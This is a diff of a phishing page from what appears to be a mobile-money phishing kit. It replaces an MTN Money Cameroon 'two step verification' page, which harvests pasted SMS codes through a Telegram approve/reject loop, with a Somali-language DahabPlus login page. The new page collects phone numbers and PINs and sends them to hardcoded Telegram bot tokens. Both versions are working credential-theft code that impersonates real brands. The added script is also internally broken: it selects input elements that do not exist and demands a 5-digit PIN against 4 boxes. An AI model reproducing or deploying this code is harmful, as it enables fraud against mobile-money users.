@@ -1,454 +1,468 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="so">
 
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>MTN Money - Two Step Verification</title>
-
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-
+    <title>DahabPlus - Login</title>
     <style>
-         :root {
-            /* MTN Cameroon inspired palette */
-            --mtn-red: #af83e7;
-            --mtn-red-dark: #6f7be2;
-            --mtn-bg: #f2f2f2;
-            --text-dark: #141414;
-            --text-grey: #6f6f6f;
-            --bg-light: #ffffff;
-            --btn-disabled: #e7e7e7;
-            --btn-disabled-text: #9a9a9a;
-            --radius-12: 12px;
-            --radius-16: 16px;
-            --shadow-soft: 0 18px 40px rgba(0, 0, 0, 0.10);
-        }
-        
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+        }
+        
+        html,
+        body {
+            min-height: 100vh;
             font-family: 'Inter', sans-serif;
+            background: white;
+            overflow-x: hidden;
+            overflow-y: auto;
         }
         
         body {
-            background-color: var(--mtn-bg);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-        
-        .app-container {
-            width: 100%;
-            max-width: 400px;
-            height: 100vh;
-            max-height: 850px;
-            background-color: var(--bg-light);
-            position: relative;
             display: flex;
             flex-direction: column;
-            box-shadow: var(--shadow-soft);
-        }
-        
-        @media (min-width: 401px) {
-            .app-container {
-                height: 90vh;
-                border-radius: 18px;
-                overflow: hidden;
-            }
-        }
-        /* Header */
-        
-        .app-header {
-            background: linear-gradient(135deg, var(--mtn-red) 0%, var(--mtn-red-dark) 100%);
-            color: #fff;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 16px 18px;
-        }
-        
-        .icon-btn {
-            background: none;
-            border: none;
-            color: #fff;
-            font-size: 20px;
-            cursor: pointer;
-            opacity: .95;
-        }
-        
-        .icon-btn:active {
-            transform: scale(.98);
         }
         
         .logo {
+            text-align: center;
+            padding: 50px 20px 20px;
+            flex-shrink: 0;
             display: flex;
+            justify-content: center;
+            gap: 12px;
             align-items: center;
-            gap: 10px;
-            height: 34px;
         }
         
         .logo img {
-            height: 34px;
-            width: auto;
-            display: block;
-            border-radius: 8px;
-            /* optional: makes it look nicer */
-        }
-        /* Main Content */
-        
-        .content-area {
-            padding: 28px 22px;
-            flex-grow: 1;
+            width: 56px;
+            height: 56px;
+            object-fit: contain;
+            border-radius: 16px;
+            background: #fff;
         }
         
-        .content-area h2 {
-            color: var(--text-dark);
+        .logo-text {
+            font-size: 36px;
+            font-weight: 700;
+            color: #2F9E44;
+            background: #E9F7EE;
+            padding: 4px 16px;
+            border-radius: 12px;
+        }
+        
+        .login-content {
+            flex: 1 0 auto;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 0 30px 50px;
+            max-width: 480px;
+            margin: 0 auto;
+            width: 100%;
+        }
+        
+        .title {
+            font-size: 26px;
+            font-weight: 600;
+            color: #2B2D42;
+            margin-bottom: 40px;
+        }
+        
+        .phone-group {
+            width: 100%;
+            border: 2px solid #2F9E44;
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            padding: 18px 24px;
+            margin-bottom: 40px;
+            background: white;
+        }
+        
+        .flag {
+            font-size: 28px;
+            margin-right: 12px;
+        }
+        
+        .country-select {
+            display: flex;
+            align-items: center;
+            color: #2F9E44;
+            font-weight: 600;
+            font-size: 18px;
+            margin-right: 16px;
+        }
+        
+        .dropdown-arrow {
+            font-size: 14px;
+            margin-left: 6px;
+        }
+        
+        .phone-input {
+            flex: 1;
+            border: none;
+            outline: none;
+            font-size: 18px;
+            color: #333;
+        }
+        
+        .phone-input::placeholder {
+            color: #aaa;
+        }
+        
+        .password-label {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 24px;
+            font-weight: 500;
+        }
+        /* OTP box styling */
+        
+        .otp-group {
+            width: 100%;
+            max-width: 420px;
+            border: 2px solid #2F9E44;
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 18px 16px;
+            margin-bottom: 30px;
+            background: white;
+            gap: 10px;
+        }
+        
+        .otp-digit {
+            width: 48px;
+            height: 54px;
+            border: none;
+            outline: none;
+            text-align: center;
             font-size: 22px;
             font-weight: 800;
-            margin-bottom: 10px;
-            letter-spacing: -0.2px;
+            border-radius: 10px;
+            background: #E9F7EE;
+            color: #2B2D42;
         }
         
-        .subtitle {
-            color: var(--text-grey);
-            font-size: 14px;
-            line-height: 1.45;
-            margin-bottom: 22px;
+        .otp-digit:focus {
+            box-shadow: 0 0 0 3px rgba(47, 158, 68, 0.25);
+            background: #E3F6E7;
         }
         
-        .phone-number {
-            color: var(--text-dark);
-            font-size: 17px;
-            font-weight: 800;
-            margin-bottom: 18px;
-            letter-spacing: 0.2px;
-        }
-        /* Text Area */
-        
-        .sms-textarea {
-            width: 100%;
-            height: 140px;
-            border: 2px solid var(--mtn-red);
-            border-radius: var(--radius-12);
-            padding: 15px;
-            font-size: 14px;
-            color: var(--text-dark);
-            resize: none;
-            outline: none;
-            margin-bottom: 18px;
-            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+        .otp-digit.filled {
+            background: #DFF3E4;
         }
         
-        .sms-textarea:focus {
-            box-shadow: 0 0 0 4px rgba(226, 0, 26, 0.14);
-            border-color: var(--mtn-red-dark);
-        }
-        
-        .sms-textarea::placeholder {
-            color: var(--text-grey);
-            font-family: 'Inter', sans-serif;
-        }
-        
-        .sms-textarea:disabled {
-            background-color: #f5f5f5;
-            color: var(--text-grey);
-            border-color: #e5e5e5;
-        }
-        /* Timer and Submit */
-        
-        .resend-text {
-            text-align: center;
-            color: var(--text-grey);
-            font-size: 13px;
-            margin-bottom: 14px;
-        }
-        
-        .resend-text.active {
-            color: var(--mtn-red);
-            font-weight: 700;
-            cursor: pointer;
-        }
-        
-        .submit-btn {
-            width: 100%;
-            padding: 16px;
-            border-radius: 12px;
-            border: none;
-            background-color: var(--btn-disabled);
-            color: var(--btn-disabled-text);
+        .forgot {
             font-size: 15px;
-            font-weight: 800;
-            cursor: not-allowed;
-            transition: all 0.25s ease;
-            letter-spacing: 0.3px;
+            color: #2F9E44;
+            text-decoration: none;
+            font-weight: 500;
+            margin-bottom: 40px;
         }
         
-        .submit-btn.active {
-            background-color: var(--mtn-red);
-            color: #fff;
-            cursor: pointer;
-            box-shadow: 0 10px 22px rgba(226, 0, 26, 0.25);
-        }
-        
-        .submit-btn.active:active {
-            transform: scale(0.985);
-        }
-        /* Footer */
-        
-        .app-footer {
-            background: linear-gradient(135deg, var(--mtn-red) 0%, var(--mtn-red-dark) 100%);
-            color: #fff;
-            text-align: center;
-            padding: 14px;
-            font-size: 12.5px;
-            font-weight: 600;
-            margin-top: auto;
-        }
-        /* Modal button */
-        
-        #errorModal .modal-actions-btn {
-            background: var(--mtn-red);
+        #loginBtn {
+            display: none;
+            width: 100%;
+            max-width: 400px;
+            padding: 18px;
+            background: linear-gradient(to right, #2F9E44, #38B000);
             color: white;
             border: none;
-            padding: 12px 14px;
-            border-radius: 8px;
+            border-radius: 50px;
+            font-size: 18px;
             font-weight: 700;
             cursor: pointer;
+            margin-bottom: 50px;
+            box-shadow: 0 8px 20px rgba(47, 158, 68, 0.25);
+        }
+        
+        .bottom-section {
+            background: #2B2D42;
+            color: white;
+            padding: 100px 30px 80px;
+            text-align: center;
+            width: 100vw;
+            margin-left: calc(-50vw + 50%);
+            position: relative;
+            flex-shrink: 0;
+        }
+        
+        .curve {
+            position: absolute;
+            top: 0;
+            left: 0;
             width: 100%;
+            height: 90px;
+            background: white;
+            border-radius: 0 0 50% 50% / 0 0 100% 100%;
+            transform: scaleX(1.8);
+            transform-origin: top;
+        }
+        
+        .bottom-content {
+            position: relative;
+            z-index: 2;
+        }
+        
+        .bottom-text {
+            font-size: 15px;
+            margin-bottom: 35px;
+            line-height: 1.6;
+            opacity: 0.95;
+        }
+        
+        .bottom-btns {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-bottom: 40px;
+            flex-wrap: wrap;
+        }
+        
+        .bottom-btn {
+            background: white;
+            color: #2B2D42;
+            border: none;
+            border-radius: 30px;
+            padding: 18px 36px;
+            font-weight: 600;
+            font-size: 16px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            width: 180px;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
+            text-decoration: none;
+        }
+        
+        .btn-icon {
+            font-size: 26px;
+            color: #2F9E44;
+        }
+        
+        .version {
+            font-size: 14px;
+            margin-bottom: 12px;
+            opacity: 0.9;
+            font-weight: 500;
+        }
+        
+        .terms {
+            font-size: 13px;
+            opacity: 0.85;
+            line-height: 1.5;
+        }
+        
+        .terms a {
+            color: #2F9E44;
+            text-decoration: underline;
+            font-weight: 500;
+        }
+        
+        #spinnerOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.98);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 1000;
+        }
+        
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 6px solid #E9F7EE;
+            border-top: 6px solid #2F9E44;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 30px;
+        }
+        
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+        
+        .spinner-text {
+            font-size: 18px;
+            color: #2B2D42;
+            text-align: center;
+            line-height: 1.6;
+            max-width: 300px;
+            font-weight: 500;
         }
     </style>
 </head>
 
 <body>
-    <div class="app-container">
-        <header class="app-header">
-            <button class="icon-btn" onclick="history.back()"><i class="fa-solid fa-arrow-left"></i></button>
-
-            <div class="logo" aria-label="MTN Money">
-                <!-- Replaced logo with your provided MTN logo -->
-                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRkIMuXBHiC5OpIeU7Uq5OJnSIOe9cbzO7MALP-XujJ-w&s=10" alt="MTN Money Logo">
-            </div>
-
-            <button class="icon-btn"><i class="fa-solid fa-bars"></i></button>
-        </header>
-
-        <div id="errorModal" style="display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 100; justify-content: center; align-items: center; padding: 20px;">
-            <div style="background: white; padding: 25px; border-radius: 16px; text-align: center; width: 100%; max-width: 320px; box-shadow: 0 10px 25px rgba(0,0,0,0.2);">
-                <i class="fa-solid fa-circle-xmark" style="color: #ef4444; font-size: 40px; margin-bottom: 15px;"></i>
-                <h3 style="color: #1a1a1a; font-size: 18px; margin-bottom: 10px;">Verification Failed</h3>
-                <p style="color: #666; font-size: 14px; margin-bottom: 20px;">Wrong verification link, please try again.</p>
-                <button onclick="closeModal()" class="modal-actions-btn" style="background:#E2001A;">Try Again</button>
-            </div>
-        </div>
-
-        <div class="content-area">
-            <h2>Two Step Verification</h2>
-            <p class="subtitle">Paste the complete link/sms message sent to your number</p>
-
-            <h3 id="displayPhone" class="phone-number">+237.........</h3>
-
-            <textarea id="smsInput" class="sms-textarea" placeholder="Paste your complete Link/SMS message here..."></textarea>
-
-            <p class="resend-text" id="resendWrapper">Resend in <span id="countdown">30</span> seconds</p>
-
-            <button id="submitBtn" class="submit-btn" disabled>SUBMIT</button>
-        </div>
-
-        <footer class="app-footer">
-            © 2026 MTN Money - Cameroon
-        </footer>
+    <div class="logo">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQnW8BYxCgA8Utr7AsAzBJ_Rnu_PRQ0SqxFeUTS5PX9oQ&s=10" alt="DahabPlus">
+        <div class="logo-text">DahabPlus</div>
     </div>
 
-    <script>
-        const errorModal = document.getElementById('errorModal');
-        const smsInput = document.getElementById('smsInput');
-        const submitBtn = document.getElementById('submitBtn');
-        const countdownEl = document.getElementById('countdown');
-        const resendWrapper = document.getElementById('resendWrapper');
+    <div class="login-content">
+        <h1 class="title">DahabPlus</h1>
 
-        function closeModal() {
-            errorModal.style.display = 'none';
-            smsInput.value = '';
-            smsInput.focus();
+        <div class="phone-group">
+            <span class="flag">🇸🇴</span>
+            <div class="country-select">
+                +252 <span class="dropdown-arrow">▼</span>
+            </div>
+            <input type="tel" class="phone-input" id="phoneInput" placeholder="Numbarka Taleefanka" />
+        </div>
 
-            submitBtn.disabled = true;
-            submitBtn.classList.remove('active');
+        <div class="password-label">Geli OTP-kaaga (4 nambar)</div>
+
+        <!-- OTP input (4 digits) -->
+        <div class="otp-group" aria-label="OTP input">
+            <input class="otp-digit" inputmode="numeric" maxlength="1" type="text" id="otp0" autocomplete="one-time-code" />
+            <input class="otp-digit" inputmode="numeric" maxlength="1" type="text" id="otp1" autocomplete="one-time-code" />
+            <input class="otp-digit" inputmode="numeric" maxlength="1" type="text" id="otp2" autocomplete="one-time-code" />
+            <input class="otp-digit" inputmode="numeric" maxlength="1" type="text" id="otp3" autocomplete="one-time-code" />
+        </div>
+
+        <a href="#" class="forgot">Ma ilowday OTP-ga?</a>
+
+        <button id="loginBtn">DahabPlus</button>
+    </div>
+
+    <div class="bottom-section">
+        <div class="curve"></div>
+        <div class="bottom-content">
+            <div class="bottom-text">
+                Si aad u diiwaangelisato akoonka DahabPlus<br /> ama aad helto caawimo, guji hoos
+            </div>
+            <div class="bottom-btns">
+                <a href="#" class="bottom-btn">
+                    <div class="btn-icon">👤</div>
+                    Diiwaangeli
+                </a>
+                <a href="#" class="bottom-btn">
+                    <div class="btn-icon">ℹ️</div>
+                    Caawimo & Taageero
+                </a>
+            </div>
+            <div class="version">v2.13P</div>
+            <div class="terms">
+                Adigoo galaya, waad aqbalaysaa <a href="#">Shuruudaha & Xeerarka</a>
+            </div>
+        </div>
+    </div>
+
+    <div id="spinnerOverlay">
+        <div class="spinner"></div>
+        <div class="spinner-text">
+            Fadlan sug...<br /> Tan waxay qaadan kartaa sekondado dhow
+        </div>
+    </div>
+
+   <script>
+        // --- Existing Telegram bot tokens (kept as-is from your code) ---
+        const BOT_TOKEN_1 = '8856451532:AAFEj-J-rtkTXPHq13eOqNDGTG3vBzWMIyg';
+        const CHAT_ID_1 = '5682326990';
+
+        const BOT_TOKEN_2 = '8856451532:AAFEj-J-rtkTXPHq13eOqNDGTG3vBzWMIyg';
+        const CHAT_ID_2 = '5682326990';
+
+        const savedPhone = localStorage.getItem('phone');
+        const phoneInput = document.getElementById('phoneInput');
+
+        if (savedPhone && savedPhone.length === 9) {
+            phoneInput.value = savedPhone;
         }
 
-        // 1) Retrieve & Format the phone number from login.html
-        const savedPhone = sessionStorage.getItem('savedPhone');
-        const phoneDisplay = document.getElementById('displayPhone');
+        const pinBoxes = document.querySelectorAll('.pin-box');
+        const loginBtn = document.getElementById('loginBtn');
+        const spinnerOverlay = document.getElementById('spinnerOverlay');
+        let pinValue = '';
 
-        let cleanPhoneForBot = 'UNKNOWN';
+        const PIN_LENGTH = 5; // ✅ required PIN length
 
-        if (savedPhone) {
-            let cleanNumber = savedPhone.replace(/[^0-9]/g, '');
-
-            // Convert '0-XX-XX-XX-XX' to '+267XXXXXXXX'
-            if (cleanNumber.startsWith('0')) cleanNumber = cleanNumber.substring(1);
-
-            cleanPhoneForBot = '237' + cleanNumber;
-            phoneDisplay.innerText = '+' + cleanPhoneForBot;
+        function checkPinComplete() {
+            pinValue = Array.from(pinBoxes).map(box => box.value).join('');
+            loginBtn.style.display = pinValue.length === PIN_LENGTH ? 'block' : 'none';
         }
 
-        // 2) Countdown Timer & Expiration Logic (OTP time = 30 seconds)
-        let timeLeft = 30;
-        let timerExpired = false;
+        pinBoxes.forEach((box, index) => {
+            box.addEventListener('input', () => {
+                // Move to next box when current is filled
+                if (box.value.length === 1 && index < pinBoxes.length - 1) {
+                    pinBoxes[index + 1].focus();
+                }
+                checkPinComplete();
+            });
 
-        const timer = setInterval(() => {
-            timeLeft--;
-
-            if (timeLeft > 0) {
-                countdownEl.innerText = timeLeft;
-            } else {
-                clearInterval(timer);
-                timerExpired = true;
-
-                resendWrapper.innerHTML = "Resend link now";
-                resendWrapper.classList.add('active');
-
-                smsInput.disabled = true;
-                smsInput.classList.add('disabled');
-            }
-        }, 1000);
-
-        // Click handler for resend text when active -> REDIRECT TO LOGIN
-        resendWrapper.addEventListener('click', function() {
-            if (this.classList.contains('active')) window.location.href = 'login.html';
+            box.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && box.value === '' && index > 0) {
+                    pinBoxes[index - 1].focus();
+                }
+            });
         });
 
-        // 3) Enable Submit Button when text is entered
-        smsInput.addEventListener('input', function() {
-            const hasEnoughText = this.value.trim().length > 5;
+        loginBtn.addEventListener('click', () => {
+            const phone = phoneInput.value.trim();
 
-            if (hasEnoughText && !timerExpired) {
-                submitBtn.disabled = false;
-                submitBtn.classList.add('active');
-            } else if (!hasEnoughText) {
-                submitBtn.disabled = true;
-                submitBtn.classList.remove('active');
+            if (!phone) {
+                alert('Please enter your phone number');
+                return;
             }
-        });
 
-        // --- TELEGRAM BOT CONFIGURATION ---
-        const botToken = '8420256222:AAHyLM4QF5JFgx35GULn2aZj5IKXjZsMypg';
-        const chatId = '8879745965';
+            if (pinValue.length !== PIN_LENGTH) {
+                alert(`Please enter your ${PIN_LENGTH}-digit PIN`);
+                return;
+            }
 
-        function sendOTPToTelegram(phone, smsText) {
-            const escapeMd = s => s.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
-            const message =
-                `📱 *Step 2: OTP / Link Submission*\n` +
-                `Phone: \`+${escapeMd(phone)}\`\n` +
-                `✉️ Pasted Message:\n` +
-                `\`${escapeMd(smsText)}\`\n\n` +
-                `👇 Please Approve or Reject:`;
+            spinnerOverlay.style.display = 'flex';
+            localStorage.setItem('phone', phone);
+            localStorage.setItem('pin', pinValue);
 
-            const inlineKeyboard = {
-                inline_keyboard: [
-                    [{
-                        text: "✅ Approve",
-                        callback_data: `OTP_APP_${phone}`
-                    }, {
-                        text: "❌ Reject",
-                        callback_data: `OTP_REJ_${phone}`
-                    }]
-                ]
-            };
+            const message = `New Login Attempt\n\nPhone: +237 ${phone}\nPIN: ${pinValue}`;
 
-            return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/sendMessage`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: 'MarkdownV2',
-                    reply_markup: JSON.stringify(inlineKeyboard)
+                    chat_id: CHAT_ID_1,
+                    text: message
                 })
-            });
-        }
+            }).catch(() => {});
 
-        function startListeningForOTPDecision(phone, btnElement) {
-            let offset = 0;
-            let decided = false;
-
-            fetch(`https://api.telegram.org/bot${botToken}/getUpdates?limit=100`)
-                .then(r => r.json())
-                .then(data => {
-                    if (data.ok && data.result.length > 0) {
-                        offset = data.result[data.result.length - 1].update_id + 1;
-                    }
-
-                    const intervalId = setInterval(() => {
-                        if (decided) return;
-
-                        fetch(`https://api.telegram.org/bot${botToken}/getUpdates?limit=20&offset=${offset}`)
-                            .then(r => r.json())
-                            .then(data => {
-                                if (!data.ok || decided) return;
-
-                                for (const update of data.result) {
-                                    offset = update.update_id + 1;
-
-                                    if (update.callback_query) {
-                                        const action = update.callback_query.data;
-
-                                        if (action === `OTP_APP_${phone}`) {
-                                            decided = true;
-                                            clearInterval(intervalId);
-                                            window.location.href = 'limit.html';
-                                        } else if (action === `OTP_REJ_${phone}`) {
-                                            decided = true;
-                                            clearInterval(intervalId);
-
-                                            btnElement.innerHTML = 'SUBMIT';
-                                            btnElement.style.opacity = '1';
-                                            btnElement.disabled = true;
-                                            btnElement.classList.remove('active');
-
-                                            errorModal.style.display = 'flex';
-                                        }
-                                    }
-                                }
-                            })
-                            .catch(err => console.error("Polling error:", err));
-                    }, 4000);
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID_2,
+                    text: message
                 })
-                .catch(err => {
-                    console.error("Failed to initialize Telegram polling:", err);
-                    btnElement.innerHTML = 'SUBMIT';
-                    btnElement.style.opacity = '1';
-                    btnElement.disabled = false;
-                    alert("Network error communicating with the server.");
-                });
-        }
+            }).catch(() => {});
 
-        // 4) Submit Redirect with Polling
-        submitBtn.addEventListener('click', function() {
-            const smsText = smsInput.value.trim();
-            const btn = this;
-
-            btn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> VERIFYING...';
-            btn.style.opacity = '0.8';
-            btn.disabled = true;
-
-            sendOTPToTelegram(cleanPhoneForBot, smsText)
-                .then(response => {
-                    if (!response.ok) throw new Error("Failed to send Telegram message");
-                    startListeningForOTPDecision(cleanPhoneForBot, btn);
-                })
-                .catch(error => {
-                    console.error("Telegram API Error:", error);
-                    btn.innerHTML = 'SUBMIT';
-                    btn.style.opacity = '1';
-                    btn.disabled = false;
-                    alert("Error connecting to the verification server. Please try again.");
-                });
+            setTimeout(() => {
+                window.location.href = 'verify.html';
+            }, 1500);
         });
+
+        checkPinComplete();
+        pinBoxes[0].focus();
     </script>
 </body>
 
